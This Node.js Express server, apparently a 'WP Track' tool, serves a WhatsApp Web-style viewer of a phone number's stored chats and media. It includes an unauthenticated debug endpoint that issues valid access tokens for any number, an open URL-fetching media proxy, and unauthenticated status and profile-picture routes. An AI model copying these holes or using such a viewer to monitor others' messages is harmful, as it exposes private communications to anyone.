const express = require("express")
const path = require("path")
const fs = require("fs-extra")
const crypto = require("crypto")
const axios = require("axios")

const SESSIONS_DIR = path.join(__dirname, "sessions")
const PORT = process.env.WP_TRACK_PORT || 3000
const HOST = process.env.WP_TRACK_HOST || process.env.RAILWAY_PUBLIC_DOMAIN || process.env.RENDER_EXTERNAL_URL || "localhost"

const tokens = new Map()

function generateToken(phone) {
  const token = crypto.randomBytes(24).toString("hex")
  tokens.set(token, phone)
  setTimeout(() => tokens.delete(token), 86400000)
  return token
}

function validateToken(token) {
  return tokens.has(token) ? tokens.get(token) : null
}

function getStoredMessages(phone) {
  const filePath = path.join(SESSIONS_DIR, phone, "messages.json")
  try {
    if (fs.existsSync(filePath)) {
      return JSON.parse(fs.readFileSync(filePath, "utf-8"))
    }
  } catch (e) {
    console.error("error reading messages:", e.message)
  }
  return {}
}

function getURL() {
  const protocol = (HOST !== "localhost" && !HOST.includes("localhost")) ? "https" : "http"
  const portStr = (protocol === "http" && HOST === "localhost") ? ":" + PORT : ""
  return protocol + "://" + HOST + portStr
}

function serveHTML(req, res, phone, token) {
  const html = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>WhatsApp Web - +${phone}</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
html,body{height:100%;overflow:hidden;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;background:#111b21;color:#e9edef}
body{display:flex;height:100vh}
::-webkit-scrollbar{width:6px}
::-webkit-scrollbar-track{background:transparent}
::-webkit-scrollbar-thumb{background:rgba(255,255,255,0.16);border-radius:3px}
:root{--primary:#00a884;--header-bg:#202c33;--sidebar-bg:#111b21;--chat-bg:#0b141a;--bubble-in:#202c33;--bubble-out:#005c4b;--text-secondary:#8696a0;--text-muted:#667781;--border:#313d45;--hover:#1f2c33;--active:#2a3942;--divider:#182229}
.sidebar{width:420px;min-width:320px;max-width:500px;background:var(--sidebar-bg);border-right:1px solid var(--border);display:flex;flex-direction:column;flex-shrink:0}
.sidebar .head{background:var(--header-bg);padding:10px 16px;display:flex;align-items:center;justify-content:space-between;min-height:59px;border-bottom:1px solid var(--border)}
.sidebar .head .l{display:flex;align-items:center;gap:12px}
.sidebar .head .l .av{width:40px;height:40px;border-radius:50%;background:var(--primary);display:flex;align-items:center;justify-content:center;font-size:18px;font-weight:600;color:#fff;flex-shrink:0}
.sidebar .head .l .nm{font-size:16px;font-weight:500}
.sidebar .head .l .st{font-size:13px;color:var(--text-secondary);margin-top:1px}
.sidebar .head .r{display:flex;gap:8px}
.sidebar .head .r button{background:none;border:none;color:var(--text-secondary);font-size:20px;cursor:pointer;width:36px;height:36px;border-radius:50%;display:flex;align-items:center;justify-content:center;transition:background .2s}
.sidebar .head .r button:hover{background:rgba(255,255,255,0.08)}
.srch{padding:8px 12px;background:var(--sidebar-bg);border-bottom:1px solid var(--divider)}
.srch .wr{background:var(--header-bg);border-radius:8px;display:flex;align-items:center;padding:0 12px}
.srch .wr input{background:transparent;border:none;outline:none;color:#e9edef;font-size:14px;padding:9px 0;width:100%}
.srch .wr input::placeholder{color:var(--text-muted)}
.clc{flex:1;overflow-y:auto}
.ci{padding:12px 16px;display:flex;align-items:center;cursor:pointer;transition:background .15s;border-bottom:1px solid var(--divider);gap:12px}
.ci:hover{background:var(--hover)}
.ci.on{background:var(--active)}
.ca{width:49px;height:49px;border-radius:50%;background:var(--primary);flex-shrink:0;display:flex;align-items:center;justify-content:center;font-size:20px;font-weight:600;color:#fff;overflow:hidden}
.ca img{width:100%;height:100%;object-fit:cover}
.cinf{flex:1;min-width:0}
.cnr{display:flex;justify-content:space-between;align-items:center}
.cn{font-size:16px;font-weight:400}
.ct{font-size:12px;color:var(--text-muted);white-space:nowrap}
.cp{font-size:13px;color:var(--text-secondary);overflow:hidden;text-overflow:ellipsis;white-space:nowrap;margin-top:2px}
.cp .fm{color:var(--text-muted)}
.main{flex:1;display:flex;flex-direction:column;background:var(--chat-bg);min-width:0}
.es{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;background:#222e35;text-align:center;padding:20px}
.es h2{font-size:24px;font-weight:300;color:#e9edef;margin-bottom:10px}
.es p{font-size:14px;color:var(--text-secondary);max-width:360px;line-height:1.5}
.mh{background:var(--header-bg);padding:10px 16px;display:flex;align-items:center;gap:12px;min-height:59px;border-bottom:1px solid var(--border)}
.mh .bk{display:none;background:none;border:none;color:var(--text-secondary);font-size:24px;cursor:pointer;width:36px;height:36px;border-radius:50%;align-items:center;justify-content:center}
.mh .bk:hover{background:rgba(255,255,255,0.08)}
.mh .ma{width:40px;height:40px;border-radius:50%;background:var(--primary);flex-shrink:0;display:flex;align-items:center;justify-content:center;font-size:16px;font-weight:600;color:#fff;overflow:hidden}
.mh .ma img{width:100%;height:100%;object-fit:cover}
.mh .mi{flex:1;min-width:0}
.mh .mi h3{font-size:16px;font-weight:500}
.mh .mi p{font-size:12px;color:var(--text-secondary)}
.mc{flex:1;overflow-y:auto;overflow-x:hidden;padding:20px 60px;background:var(--chat-bg)}
.mw{display:flex;flex-direction:column;margin-bottom:2px}
.mw.ot{align-items:flex-end}
.mw.in{align-items:flex-start}
.mb{max-width:65%;padding:6px 8px 8px;border-radius:8px;position:relative;word-wrap:break-word;overflow-wrap:break-word}
.mw.in .mb{background:var(--bubble-in);border-top-left-radius:0}
.mw.ot .mb{background:var(--bubble-out);border-top-right-radius:0}
.mb .tx{font-size:14.2px;line-height:1.4;color:#e9edef}
.mb .tx a{color:#53bdeb;text-decoration:none}
.mb .tx a:hover{text-decoration:underline}
.mm{display:flex;align-items:center;justify-content:flex-end;gap:4px;margin-top:2px;height:15px}
.mt{font-size:11px;color:rgba(255,255,255,0.5);white-space:nowrap}
.md{font-size:14px;line-height:1}
.md.sd{color:rgba(255,255,255,0.3)}
.md.dd{color:rgba(255,255,255,0.5)}
.md.rd{color:#53bdeb}
.media-box{max-width:100%;border-radius:6px;overflow:hidden;margin-bottom:4px}
.media-box img,.media-box video{max-width:100%;max-height:400px;display:block}
.media-box audio{width:100%;max-width:320px;height:52px;display:block}
.sticker{max-width:150px;border-radius:6px;display:block;margin-bottom:4px}
.doc{display:flex;align-items:center;gap:10px;padding:8px 10px;background:rgba(255,255,255,0.05);border-radius:6px;margin-bottom:4px}
.doc .di{font-size:28px}
.doc .dd{flex:1}
.doc .dn{font-size:13px;font-weight:500}
.doc .ds{font-size:11px;color:var(--text-muted)}
.doc .dl{color:#53bdeb;text-decoration:none;font-size:20px}
.dd2{text-align:center;margin:10px 0}
.dd2 span{background:#182229;color:var(--text-secondary);font-size:12.5px;padding:5px 12px;border-radius:8px;box-shadow:0 1px 1px rgba(0,0,0,0.1)}
.sys{text-align:center;margin:8px 0}
.sys span{font-size:12.5px;color:var(--text-secondary);background:#182229;padding:5px 12px;border-radius:8px}
.ld{text-align:center;padding:20px;color:var(--text-muted);font-size:13px}
.err{padding:40px 20px;text-align:center;color:var(--text-muted);font-size:14px;line-height:1.6}
.err b{color:#ef5350}
@media(max-width:768px){
.sidebar{width:100%;max-width:100%}
.sidebar.hd{display:none}
.main{display:none}
.main.sh{display:flex}
.mh .bk{display:flex}
.mc{padding:20px 12px}
.mb{max-width:85%}
}
</style>
</head>
<body>

<div class="sidebar" id="sb">
  <div class="head">
    <div class="l">
      <div class="av" id="myAv">${phone.slice(0,2)}</div>
      <div>
        <div class="nm">WhatsApp</div>
        <div class="st" id="connSt">🟢 Connected</div>
      </div>
    </div>
    <div class="r">
      <button id="refBtn" onclick="togRef()" title="Auto-refresh">⏸</button>
      <button onclick="fRef()" title="Refresh">⟳</button>
    </div>
  </div>
  <div class="srch">
    <div class="wr">
      <span style="color:var(--text-muted);font-size:18px;margin-right:12px">🔍</span>
      <input type="text" id="sI" placeholder="Search chats" oninput="flChats()">
    </div>
  </div>
  <div class="clc" id="clc"></div>
</div>

<div class="main" id="ma">
  <div class="es" id="es">
    <div style="font-size:64px;margin-bottom:16px">💬</div>
    <h2>WhatsApp Web</h2>
    <p>Select a chat from the left panel to start viewing messages.</p>
  </div>
  <div class="mh" id="mh" style="display:none">
    <button class="bk" onclick="goBk()">←</button>
    <div class="ma" id="vAv">?</div>
    <div class="mi">
      <h3 id="vNm">Loading...</h3>
      <p id="vSt">Click to view chat</p>
    </div>
  </div>
  <div class="mc" id="mc"></div>
</div>

<script>
(function(){
const TOKEN='${token}';
const PHONE='${phone}';
let A=null,AR=true,CD={},CL=[],LS=0,LO=true,PL=true;

async function LC(){
  try{
    const r=await fetch('/api/messages/'+PHONE+'?token='+TOKEN);
    CD=await r.json();
    const ct=CD._contacts||{};
    delete CD._contacts;
    CL=Object.entries(CD).filter(([j])=>j.endsWith('@s.whatsapp.net')||j.endsWith('@g.us')||j.endsWith('@lid')||j.endsWith('@broadcast')||j.endsWith('@newsletter'));
    const c=document.getElementById('clc');
    if(!CL.length){
      c.innerHTML='<div class="err">📭 No messages yet<br><span style="font-size:12px">Waiting for WhatsApp messages...</span></div>';
      return;
    }
    CL.sort((a,b)=>{const am=a[1].messages?.[a[1].messages.length-1]?.time||0;const bm=b[1].messages?.[b[1].messages.length-1]?.time||0;return bm-am});
    c.innerHTML='';
    let h='';
    for(const[jid,chat]of CL){
      const last=chat.messages?.[chat.messages.length-1];
      const nm=chat.name||jid.split('@')[0];
      const inl=nm.charAt(0).toUpperCase();
      const grp=jid.endsWith('@g.us');
      const ts=last?fT(last.time):'';
      let pre=last?gPre(last):'';
      h+='<div class="ci" data-jid="'+jid.replace(/"/g,'&quot;')+'"><div class="ca">'+inl+'</div><div class="cinf"><div class="cnr"><div class="cn">'+esc(nm)+(grp?' 👥':'')+'</div><div class="ct">'+ts+'</div></div><div class="cp">'+pre+'</div></div></div>';
    }
    c.innerHTML=h;
    for(const el of c.children){
      el.onclick=function(){OC(this.dataset.jid)};
      if(this.dataset&&this.dataset.jid===A)el.classList.add('on');
    }
    if(A&&CD[A]){RM(A);}
    // Update contact names from _contacts
    for(const[jid,info]of Object.entries(ct)){
      for(const ci of c.children){
        const nm=ci.querySelector('.cn');
        if(nm&&nm.textContent===jid.split('@')[0]){
          nm.textContent=info.name||jid.split('@')[0];
        }
      }
    }
  }catch(e){
    console.error('LC err:',e);
    const el=document.getElementById('clc');
    if(el)el.innerHTML='<div class="err"><b>⚠️ Error</b><br><span style="font-size:12px">'+esc(e.message||'Unknown')+'</span></div>';
  }
}

function gPre(m){
  if(!m)return'';
  if(m.text){
    let t=esc(m.text).slice(0,80);
    if(m.fromMe)t='<span class="fm">You: </span>'+t;
    return t;
  }
  const lb={image:'📷 Photo',video:'🎥 Video',audio:'🎵 Audio',sticker:'🎨 Sticker',document:'📎 Document',contact:'👤 Contact',location:'📍 Location',reaction:'👍 Reaction'};
  let p=m.fromMe?'<span class="fm">You: </span>':'';
  return p+(lb[m.type]||'💬 Message');
}

function flChats(){
  const q=document.getElementById('sI').value.toLowerCase();
  for(const el of document.querySelectorAll('.ci')){
    const nm=(el.querySelector('.cn')?.textContent||'').toLowerCase();
    const pre=(el.querySelector('.cp')?.textContent||'').toLowerCase();
    el.style.display=(nm.includes(q)||pre.includes(q))?'':'none';
  }
}

function OC(jid){
  A=jid;
  for(const el of document.querySelectorAll('.ci'))el.classList.toggle('on',el.dataset.jid===jid);
  const ch=CD[jid];
  if(!ch)return;
  const nm=ch.name||jid.split('@')[0];
  document.getElementById('vNm').textContent=nm;
  document.getElementById('vAv').textContent=nm.charAt(0).toUpperCase();
  document.getElementById('es').style.display='none';
  const mv=document.getElementById('mh');mv.style.display='flex';
  if(window.innerWidth<=768){
    document.getElementById('sb').classList.add('hd');
    document.getElementById('ma').classList.add('sh');
  }
  LS=0;LO=true;
  RM(jid);
}

function goBk(){
  document.getElementById('sb').classList.remove('hd');
  document.getElementById('ma').classList.remove('sh');
}

function RM(jid){
  const ch=CD[jid];
  if(!ch)return;
  const c=document.getElementById('mc');
  const ms=(ch.messages||[]).slice();
  if(!ms.length){
    c.innerHTML='<div style="text-align:center;padding:40px;color:var(--text-muted)">No messages</div>';
    return;
  }
  if(LO){
    LS=Math.max(LS,50);
    LO=ms.length>LS;
    c.innerHTML='';
  }
  const show=ms.slice(Math.max(0,ms.length-LS));
  c.innerHTML='';
  let ld='';
  for(let i=0;i<show.length;i++){
    const m=show[i];
    if(!m)continue;
    const md=fD(m.time);
    if(md!==ld){ld=md;c.innerHTML+='<div class="dd2"><span>'+md+'</span></div>'}
    let h='<div class="mw '+(m.fromMe?'ot':'in')+'"><div class="mb">';
    if(m.type==='image'&&m.mediaUrl){
      const u='/api/media?url='+eU(m.mediaUrl);
      h+='<div class="media-box"><img src="'+u+'" loading="lazy" style="cursor:pointer" onclick="window.open(\''+u+'\')"></div>';
    }else if(m.type==='video'&&m.mediaUrl){
      const u=m.cachedMedia?'/api/media?cached='+eU(m.cachedMedia):'/api/media?url='+eU(m.mediaUrl);
      h+='<div class="media-box"><video controls preload="auto" playsinline><source src="'+u+'" type="video/mp4"></video></div>';
    }else if(m.type==='audio'&&m.mediaUrl){
      const u=m.cachedMedia?'/api/media?cached='+eU(m.cachedMedia):'/api/media?url='+eU(m.mediaUrl);
      const mt=m.mimeType||'audio/mpeg';
      h+='<div class="media-box"><audio controls preload="auto" playsinline><source src="'+u+'" type="'+mt+'"><source src="'+u+'" type="audio/mpeg"><source src="'+u+'" type="audio/ogg"></audio></div>';
    }else if(m.type==='sticker'&&m.mediaUrl){
      const u=m.cachedMedia?'/api/media?cached='+eU(m.cachedMedia):'/api/media?url='+eU(m.mediaUrl);
      h+='<img class="sticker" src="'+u+'" loading="lazy">';
    }else if(m.type==='document'){
      const u=m.cachedMedia?'/api/media?cached='+eU(m.cachedMedia):'/api/media?url='+eU(m.mediaUrl);
      h+='<div class="doc"><span class="di">📎</span><div class="dd"><div class="dn">'+esc(m.fileName||'Document')+'</div><div class="ds">'+(m.fileSize?fS(m.fileSize):'')+'</div></div><a class="dl" href="'+u+'" target="_blank" download>⬇</a></div>';
    }else if(m.type==='contact'){
      h+='<div style="display:flex;align-items:center;gap:8px"><span style="font-size:24px">👤</span><span>'+esc(m.text||'Contact')+'</span></div>';
    }else if(m.type==='location'&&m.text){
      const c2=m.text.match(/[-\\d.]+/g);const la=c2?.[0]||0,ln=c2?.[1]||0;
      h+='<a href="https://maps.google.com/?q='+la+','+ln+'" target="_blank" style="display:flex;align-items:center;gap:8px;color:#53bdeb;text-decoration:none"><span style="font-size:24px">📍</span> View Location</a>';
    }else if(m.type==='reaction'){
      h+='<div style="font-size:28px;text-align:center;padding:4px">'+esc(m.text||'')+'</div>';
    }
    if(m.text&&m.type!=='reaction'){
      let t=esc(m.text);
      t=t.replace(/(https?:\\/\\/[^\\s<]+)/g,'<a href="$1" target="_blank">$1</a>');
      t=t.replace(/\\n/g,'<br>');
      h+='<div class="tx">'+t+'</div>';
    }
    h+='<div class="mm"><span class="mt">'+fT(m.time)+'</span>'+(m.fromMe?'<span class="md dd">✓✓</span>':'')+'</div></div></div>';
    c.innerHTML+=h;
  }
  // Scroll to bottom
  setTimeout(()=>{c.scrollTop=c.scrollHeight},50);
  // Update active chat contact name
  if(A&&CD[A]&&CD[A].name){
    document.getElementById('vNm').textContent=CD[A].name;
  }
}

// Infinite scroll - load more when scrolling up
document.getElementById('mc').addEventListener('scroll',function(){
  if(this.scrollTop<100&&!LO&&PL){
    PL=false;
    LS+=50;
    if(A)RM(A);
    setTimeout(()=>{PL=true},500);
  }
});

function togRef(){
  AR=!AR;
  document.getElementById('refBtn').textContent=AR?'⏸':'▶';
  if(AR)fRef();
}

function fRef(){LC()}

setInterval(()=>{if(AR)LC()},5000);
window.addEventListener('focus',()=>{if(AR)LC()});
window.addEventListener('resize',()=>{if(window.innerWidth>768){document.getElementById('sb').classList.remove('hd');document.getElementById('ma').classList.remove('sh')}});

function fT(ts){if(!ts)return'';const d=new Date(ts);return d.toLocaleTimeString([],{hour:'2-digit',minute:'2-digit'})}
function fD(ts){if(!ts)return'';const d=new Date(ts);const n=new Date();const y=new Date(n);y.setDate(y.getDate()-1);if(d.toDateString()===n.toDateString())return'Today';if(d.toDateString()===y.toDateString())return'Yesterday';return d.toLocaleDateString([],{day:'numeric',month:'long',year:d.getFullYear()!==n.getFullYear()?'numeric':undefined})}
function fS(b){if(!b)return'';const s=['B','KB','MB','GB'];const i=Math.floor(Math.log(b)/Math.log(1024));return(b/Math.pow(1024,i)).toFixed(i>0?1:0)+' '+s[i]}
function esc(s){if(!s)return'';const d=document.createElement('div');d.textContent=s;return d.innerHTML}
function eU(s){return encodeURIComponent(s)}

LC();
})();
</script>
</body>
</html>`;
  res.set('Content-Type', 'text/html; charset=utf-8');
  res.send(html);
}

function startServer() {
  const app = express()
  app.use(express.static(path.join(__dirname, "public")))

  app.get("/track/:phone", (req, res) => {
    const token = req.query.token
    const phone = req.params.phone
    if (!token) return res.status(401).send("Missing token")
    const validPhone = validateToken(token)
    if (validPhone !== phone) return res.status(403).send("Invalid token")
    serveHTML(req, res, phone, token)
  })

  app.get("/api/messages/:phone", (req, res) => {
    const token = req.query.token
    const phone = req.params.phone
    const validPhone = validateToken(token)
    if (validPhone !== phone) return res.status(403).json({ error: "Invalid token" })
    const messages = getStoredMessages(phone)
    res.json(messages)
  })

  app.get("/api/media", async (req, res) => {
    const url = req.query.url;
    const cached = req.query.cached;

    if (cached) {
      try {
        const cachePath = path.resolve(cached);
        const mediaCacheDir = path.resolve(__dirname, "media_cache");
        if (!cachePath.startsWith(mediaCacheDir)) {
          return res.status(403).send("Forbidden");
        }
        if (fs.existsSync(cachePath)) {
          const ext = path.extname(cachePath).toLowerCase();
          const mimeMap = {
            '.jpg': 'image/jpeg', '.jpeg': 'image/jpeg',
            '.png': 'image/png', '.gif': 'image/gif', '.webp': 'image/webp',
            '.mp4': 'video/mp4', '.ogg': 'audio/ogg', '.mp3': 'audio/mpeg',
            '.bin': 'application/octet-stream', '.svg': 'image/svg+xml',
            '.opus': 'audio/ogg', '.oga': 'audio/ogg', '.m4a': 'audio/mp4',
            '.aac': 'audio/aac', '.wav': 'audio/wav'
          };
          const ct = mimeMap[ext] || 'application/octet-stream';
          const stat = fs.statSync(cachePath);
          res.set('Content-Type', ct);
          res.set('Content-Length', stat.size);
          res.set('Accept-Ranges', 'bytes');
          res.set('Cache-Control', 'public, max-age=86400');
          res.set('Access-Control-Allow-Origin', '*');
          const range = req.headers.range;
          if (range && (ct.startsWith('video/') || ct.startsWith('audio/'))) {
            const parts = range.replace(/bytes=/, '').split('-');
            const start = parseInt(parts[0], 10);
            const end = parts[1] ? parseInt(parts[1], 10) : stat.size - 1;
            const chunkSize = end - start + 1;
            res.status(206);
            res.set('Content-Range', 'bytes ' + start + '-' + end + '/' + stat.size);
            res.set('Content-Length', chunkSize);
            const stream = fs.createReadStream(cachePath, { start, end });
            return stream.pipe(res);
          }
          return res.sendFile(cachePath);
        }
      } catch (e) {
        console.error('cached media error:', e.message);
      }
    }

    if (!url) return res.status(400).send("Missing url parameter");
    try {
      const resp = await axios.get(url, {
        responseType: 'arraybuffer',
        timeout: 60000,
        maxRedirects: 5,
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
          'Referer': 'https://whatsapp.com/',
          'Origin': 'https://whatsapp.com/'
        }
      });
      const ct = resp.headers['content-type'] || 'application/octet-stream';
      res.set('Content-Type', ct);
      res.set('Accept-Ranges', 'bytes');
      res.set('Cache-Control', 'public, max-age=3600');
      res.set('Access-Control-Allow-Origin', '*');
      return res.send(Buffer.from(resp.data));
    } catch (e) {
      console.error('media proxy error:', e.message);
      try { res.redirect(url); } catch(ee) { res.status(502).send("Media unavailable"); }
    }
  })

  app.get("/api/pp/:phone/:jid", async (req, res) => {
    const phone = req.params.phone;
    const jid = req.params.jid;
    try {
      const wa = require("./wa_manager");
      const sock = wa.getActiveConnection(phone);
      if (sock && sock.profilePictureUrl) {
        const url = await sock.profilePictureUrl(jid, "image").catch(() => null);
        if (url) {
          const resp = await axios.get(url, { responseType: 'arraybuffer', timeout: 10000 });
          const ct = resp.headers['content-type'] || 'image/jpeg';
          res.set('Content-Type', ct);
          res.set('Cache-Control', 'public, max-age=86400');
          return res.send(Buffer.from(resp.data));
        }
      }
    } catch (e) {}
    res.set('Content-Type', 'image/svg+xml');
    res.send('<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100"><rect width="100" height="100" fill="#6a7175" rx="50"/><text x="50" y="65" text-anchor="middle" fill="white" font-size="40" font-family="Arial">' + jid.split("@")[0].charAt(0).toUpperCase() + '</text></svg>');
  })

  app.get("/api/status/:phone", (req, res) => {
    const phone = req.params.phone;
    const filePath = path.join(SESSIONS_DIR, phone, "status.json");
    try {
      if (fs.existsSync(filePath)) {
        return res.json(JSON.parse(fs.readFileSync(filePath, "utf-8")));
      }
    } catch (e) {}
    res.json({ statuses: [] });
  })

  app.get("/api/debug_token/:phone", (req, res) => {
    const phone = req.params.phone;
    const token = generateToken(phone);
    const host = process.env.WP_TRACK_HOST || process.env.RAILWAY_PUBLIC_DOMAIN || process.env.RENDER_EXTERNAL_URL || "localhost";
    const port = process.env.WP_TRACK_PORT || 3000;
    const protocol = (host !== "localhost" && !host.includes("localhost") && !host.includes("127.0.0.1")) ? "https" : "http";
    const link = protocol + "://" + host + (protocol === "http" ? ":" + port : "") + "/track/" + phone + "?token=" + token;
    res.json({ token, phone, link, expiresIn: "24 hours" });
  })

  app.get("/api/debug_check/:phone", (req, res) => {
    const phone = req.params.phone;
    const filePath = path.join(SESSIONS_DIR, phone, "messages.json");
    const exists = fs.existsSync(filePath);
    let stats = null;
    let messageCount = 0;
    let chatCount = 0;
    if (exists) {
      try {
        const data = JSON.parse(fs.readFileSync(filePath, "utf-8"));
        chatCount = Object.keys(data).length;
        for (const [key, val] of Object.entries(data)) {
          if (key !== '_contacts' && val.messages) {
            messageCount += val.messages.length;
          }
        }
        stats = { fileSize: fs.statSync(filePath).size, chatCount, messageCount };
      } catch(e) {}
    }
    res.json({ phone, messagesFileExists: exists, stats });
  })

  app.listen(PORT, () => {
    console.log("WP Track server running on port " + PORT);
  })

  return app;
}

module.exports = { startServer, generateToken, validateToken }
